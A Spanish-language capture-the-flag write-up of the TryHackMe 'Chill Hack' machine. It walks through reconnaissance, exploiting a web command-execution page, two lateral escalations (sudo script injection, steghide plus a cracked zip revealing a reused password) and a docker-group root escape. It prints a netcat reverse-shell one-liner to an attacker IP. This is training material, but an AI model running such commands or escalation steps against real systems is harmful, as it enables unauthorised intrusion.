---
layout: single
title: Chill Hack - TryHackMe
excerpt: "Debemos encontrar dos banderas en la maquina `Chill Hack`. Donde a partir del escaneo de puertos de `Nmap` pude saber que hay un servicio `HTTP`,`SSH`, y `FTP`. Además, con el script `http-title.nse` de Nmap supe que hay una página web almacenada en el servidor web. Luego, utilice `wfuzz` para realizar fuerza bruta de directorios sobre sitio web, llegando a encontrar una página web, que presentaba la vulnerabilidad `RCE`, y mediante su explotación obtuvimos acceso al sistema destino. Luego, realizamos una escalada de privilegios horizontal aprovechando que podíamos ejecutar un script con los privilegios del usuario `apaar`.Luego, realizamos otra escalada horizontal a partir del uso de unas credenciales encontradas en un archivo `PHP` oculto en una imagen `JPEG` que logramos extraer utilizando `Steghide` y `John The Ripper`. Luego, realizamos una escalada vertical para ser el usuario root aprovechando que el usuario `anurodh` pertenece al grupo secundario `Docker`."
date: 2023-07-17	
classes: wide
header:
  teaser: /assets/images/ChillHack/image003.png
  teaser_home_page: true
  icon: /assets/images/descarga7.webp
categories:
  - TryHackMe
  - ctf
tags:
  - Linux  
  - OpenVPN
  - Nmap
  - SSH
  - HTTP
  - FTP
  - John The Ripper
  - RCE
  - Docker
  - Steghide
  - Sudo
  - Wfuzz
  - PHP
---

![](/assets/images/ChillHack/image001.png)

## SUMMARY

Debemos encontrar dos banderas en la maquina `Chill Hack`. Donde a partir del escaneo de puertos de `Nmap` pude saber que hay un servicio `HTTP`,`SSH`, y `FTP`. Además, con el script `http-title.nse` de Nmap supe que hay una página web almacenada en el servidor web. Luego, utilice `wfuzz` para realizar fuerza bruta de directorios sobre sitio web, llegando a encontrar una página web, que presentaba la vulnerabilidad `RCE`, y mediante su explotación obtuvimos acceso al sistema destino. Luego, realizamos una escalada de privilegios horizontal aprovechando que podíamos ejecutar un script con los privilegios del usuario `apaar`.Luego, realizamos otra escalada horizontal a partir del uso de unas credenciales encontradas en un archivo `PHP` oculto en una imagen `JPEG` que logramos extraer utilizando `Steghide` y `John The Ripper`. Luego, realizamos una escalada vertical para ser el usuario root aprovechando que el usuario `anurodh` pertenece al grupo secundario `Docker`.

## FASE RECONOCIMIENTO

Para resolver este ejercicio empezaremos utilizando el comando `openvpn` con el fin de establecer una conexion VPN con la red virtual donde esta la maquina `Chill Hack`. Para ello utilizaremos el archivo de configuracion, que lo podemos descargar en la plataforma de Tryhackme, que puede incluir informacion como la direccion del servidor VPN, los certificados y claves de seguridad, la configuracion de encriptacion, etc.

![](/assets/images/ChillHack/image005.png)

Luego de que se establece la conexion VPN se crea una interfaz virtual de red en nuestra maquina. Donde se enruta todo el trafico de red a traves de esa interfaz. 

![](/assets/images/ChillHack/image007.png)

Ademas, la plataforma de Tryhackme nos muestra la direccion ip de la maquina `Chill Hack`.

![](/assets/images/ChillHack/image009.png)

## FASE ESCANEO Y ENUMERACION

Luego pasaremos a la fase de Escaneo y Enumeración con el fin de poder escanear los puertos del nodo. Además, obtendremos los servicios que se han levantado en los puertos abiertos, las versiones de los servicios, y el sistema operativo de la máquina `Chill Hack`. Para ello utilizaremos `Nmap`. Donde le pasaremos los siguientes parámetros:
- El parámetro -sC o –script=”default” para utilizar todos los scripts de la categoría default con el fin de realizar un escaneo y detección de los puertos de
manera avanzada.
- El parámetro -sV con el fin de conocer las versiones de los servicios levantados en los puertos abiertos.
- El parámetro -n para evitar la resolución DNS, y el parámetro –max-rate para indicarle el número máximo de paquetes por segundo que va a utilizar Nmap
para el escaneo con el fin de evitar sobrecargar la red con el tráfico generado por la herramienta.
- El parámetro -p- para realizar un escaneo de los 65535 puertos del nodo y el parámetro –open con el fin de que nos muestre información solo de los puertos
abiertos.

![](/assets/images/ChillHack/image011.png)

Los resultados que obtuvimos del escaneo vienen a ser:
- Hay un servicio HTTP levantado en el puerto 80 y 8080, y el programa servidor HTTP que se está corriendo. Además, la versión del programa servidor HTT
- A partir del script http-tittle.nse de Nmap llegamos a saber que hay una página web que se aloja en el servidor web, que se utilizando el puerto 8080.
- Hay un servicio FTP que se está levantado en el puerto 21, y el programa servidor FT que se está corriendo. Además, la versión del programa servidor FTP.
- A partir del script ftp-anom.nse de Nmap se llegó a comprobar que el servidor FTP admite conexiones anónimas, es decir, permite que usuarios anónimos puedan acceder al servidor FTP, y sus recursos compartidos sin proporcionar credenciales de autenticación. Además, nos lista o enumera los recursos compartidos cual podemos acceder sin proveer credenciales en la autenticación
- Hay un servicio SSH, que esta levantado en el puerto 22, y el programa servidor SSH que se está corriendo. Además, la versión del programa servidor SSH

Ahora accederemos al servidor FTP a través de una conexión anónima con el fin de observar el archivo compartido note.txt.

![](/assets/images/ChillHack/image013.png)

Podemos observar que el archivo note.txt solo contiene una indicación del usuario Apaar hacia el usuario Anurodh.

Ahora observaremos la página web alojada en el servidor web del sistema destino, que llegamos a encontrar con el script de Nmap, desde mi navegador web

![](/assets/images/ChillHack/image015.png)

![](/assets/images/ChillHack/image017.png)

Podemos observar que la página web viene a ser la página de inicio de un sitio web, Además, revisando el código fuente de la página web, encontramos varias etiquetas de anclaje cuyos atributos href contienen enlaces de páginas web del sitio web, que no tienen mucha importancia.

Ahora realizaremos fuerza bruta de directorios sobre el directorio del sitio web con el fin de encontrar un recurso escondido. Para ello utilizaremos wfuzz que viene a ser una herramienta automatizada que nos permite realizar fuerza bruta de directorios

![](/assets/images/ChillHack/image019.png)

Podemos observar que la herramienta llego a encontrar nuevos recursos escondidos llamados secrets, css, images, js, fonts.

Ahora accederemos al recurso images a través de mi navegador web para observar su contenido

![](/assets/images/ChillHack/image021.png)

Podemos observar que el recurso images viene a ser un directorio que contiene las imágenes utilizadas en el sitio web.

Ahora accederemos al recurso css a través de mi navegador web para observar su contenido

![](/assets/images/ChillHack/image023.png)

Podemos observar que el recurso css viene a ser un directorio que contiene los archivos css utilizados en el sitio web.

Ahora accederemos al recurso jss a través de mi navegador web para observar su contenido

![](/assets/images/ChillHack/image025.png)

Podemos observar que el recurso js viene a ser un directorio que contiene los archivos JavaScript utilizados en el sitio web.

Ahora accederemos al recurso fonts a través de mi navegador web para observar su contenido

![](/assets/images/ChillHack/image027.png)

Podemos observar que el recurso fonts viene a ser un directorio que contiene archivos sin importancia.

Ahora accederemos al recurso secret a través de mi navegador web para observar su contenido

![](/assets/images/ChillHack/image029.png)

![](/assets/images/ChillHack/image031.png)

Podemos observar que el recurso secret viene a ser una pagina web que nos permite ejecutar comandos remotos en el sistema destino, pero hay un filtro que no permite ejecutar varios comandos. Con esto tiene mucho sentido el contenido del archivo note.txt encontrada en el servidor FTP.

## FASE HACKING O GANAR ACCESO O EXPLOTACION
Ahora probaremos el comando mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.8.123.194 1500 >/tmp/f, que nos debería generar una reverse Shell en el caso de que no fuese filtrado, pero antes habilitaremos el puerto 1500 para que este en escucha esperando la conexión entrante generada por el comando anterior.

![](/assets/images/ChillHack/image033.png)

![](/assets/images/ChillHack/image035.png)

![](/assets/images/ChillHack/image037.png)

Podemos observar que el filtro de la pagina web no llego a filtrar adecuadamente el comando que insertamos y ejecuto la reverse shell. Por lo tanto, presenta la vulnerabilidad RCE. 

De esta manera llegamos a ser el usuario www-data en el sistema destino.

![](/assets/images/ChillHack/image039.png)

Además, podemos observar que al usuario www-data se le ha configurado para que utilice la Shell nologin cuando inicie sesión en el sistema destino. Esta Shell viene a ser no interactiva y estable. Por lo tanto, realizaremos un tratamiento de la tty para tener una Shell estable e interactiva.

![](/assets/images/ChillHack/image041.png)

![](/assets/images/ChillHack/image043.png)

## FASE ESCALADA DE PRIVILEGIOS 
Ahora debemos buscar un vector de escalada de privilegios con el fin de ser un usuario con privilegios más elevados. Para ello enumeraremos los comandos y programas que puede ejecutar el usuario www-data con los privilegios de otros usuarios.

![](/assets/images/ChillHack/image045.png)

![](/assets/images/ChillHack/image047.png)

![](/assets/images/ChillHack/image049.png)

Podemos observar que el usuario www-data puede ejecutar el script .helpline.sh con los privilegios del usuario apaar sin la necesidad de proveer credenciales. Además, analizando el contenido del script, podemos observar que presenta un fallo que podemos explotar para escalar privilegios ya que cuando digitamos el mensaje se va almacenar en la variable msg, y luego va ser ejecutada como un comando en ves de ser mostrada como una cadena de caracteres.

Ahora digitaremos como mensaje un script que nos genere una reverse Shell siendo el usuario apaar, pero antes debemos habilitar el puerto 1900 en mi sistema para que este en escucha y esperando las conexiones entrantes.

![](/assets/images/ChillHack/image051.png)

![](/assets/images/ChillHack/image053.png)

![](/assets/images/ChillHack/image055.png)

![](/assets/images/ChillHack/image057.png)

De esta manera llegamos a ser el usuario apaar mediante una escalada de privilegios horizontal.

Ahora realizaremos una enumeración manual sobre los directorios del sistema objetivo en busca de vectores de escalada de privilegios.

![](/assets/images/ChillHack/image059.png)

![](/assets/images/ChillHack/image061.png)

Podemos observar que llegamos a encontrar el directorio .ssh, que debería contener las claves privadas y publicas para permitir la autenticación al usuario apaar a través de la clave privada SSH, pero solo contiene el archivo authorized_keys que contiene la clave publica para que el servidor SSH pueda reconocer la clave pública.

Ahora seguiremos con la enumeración manual sobre los directorios del sistema objetivo en busca de vectores de escalada de privilegios.

![](/assets/images/ChillHack/image063.png)

![](/assets/images/ChillHack/image065.png)

Podemos observar en el archivo hacker.php un mensaje que hace referencia a buscar en la imagen hacker-with-laptop_23-2147985341.jpg por archivos ocultos que pueda contener. Para ello utilizaremos steghide, que viene a ser una herramienta de esteganografía, y nos permite extraer archivos datos ocultos de archivos e imágenes, pero primero descargaremos esta imagen en nuestro sistema para ello utilizaremos el comando scp, que nos permite transferir archivos a través del servicio SSH.

![](/assets/images/ChillHack/image067.png)

![](/assets/images/ChillHack/image069.png)

![](/assets/images/ChillHack/image071.png)

![](/assets/images/ChillHack/image073.png)

Podemos observar que, al extraer los datos ocultos de la imagen, nos encontramos con el archivo backup.zip, que contiene un archivo php, pero el archivo zip está cifrado y requerimos de una contraseña para descomprimir su contenido.

Ahora utilizaremos John The Ripper para poder crackear la contraseña del archivo backup.zip.

![](/assets/images/ChillHack/image075.png)

Podemos observar que John The Ripper logro crackear la contraseña.

Ahora descomprimiremos el contenido del archivo zip con el fin de obtener el archivo sourcer_soce.php.

![](/assets/images/ChillHack/image079.png)

![](/assets/images/ChillHack/image081.png)

Podemos observar que el archivo php contiene un script en PHP que va a ser utilizado en un login o formulario, que va a contener dos parámetros: username y password para la autenticación. Además, si el valor del parámetro password, codificado en base64 es igual a IWQwbnRLbjB3bVlwQHNzdzByZA==, la autenticación será válida y se imprimirá un mensaje diciendo Welcome Anurodh. Esto nos da a suponer que la credencial codificada en base64 del usuario Anurodh en el formulario es IWQwbnRLbjB3bVlwQHNzdzByZA==.

Ahora decodificaremos esta cadena de caracteres para saber si el usuario Anurodh ha reutilizado la credencial en su inicio de sesión en el sistema destino.

![](/assets/images/ChillHack/image083.png)

Podemos observar que nuestra suposición de la reutilización de credenciales es correcta. 

De esta manera llegamos a ser el usuario anurodh mediante una escalada de privilegios horizontal. Además, podemos observar que el usuario anurodh pertenece al grupo secundario Docker. Por lo tanto, el usuario va a poder ejecutar y administrar contenedores Docker sin la necesidad de utilizar sudo e ingresar las credenciales del usuario root. Esto lo podemos comprobar ejecutando el siguiente comando para observar todos los contenedores que se han ejecutado en el sistema.

![](/assets/images/ChillHack/image085.png)

Aprovechando que podemos ejecutar contenedores Docker, utilizaremos el siguiente comando con el fin de iniciar un contenedor utilizando la imagen de Alpine Linux, y montando el sistema de archivos del sistema destino en el directorio /mnt del contenedor. Luego, cambiaremos el directorio raíz del contenedor a /mnt y ejecutaremos una shell interactiva dentro del contenedor con el fin de poder acceder a todos los archivos y directorios del sistema destino con los privilegios del usuario root.

![](/assets/images/ChillHack/image087.png)

De esta manera llegamos a ser el usuario root mediante una escalada de privilegios vertical.

Ahora buscaremos las dos banderas contenidas en los archivos local.txt y proof.txt. Para localizar los archivos utilizaremos el comando find para buscar
desde el directorio /, archivos con sus nombres.

![](/assets/images/ChillHack/image089.png)

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 



































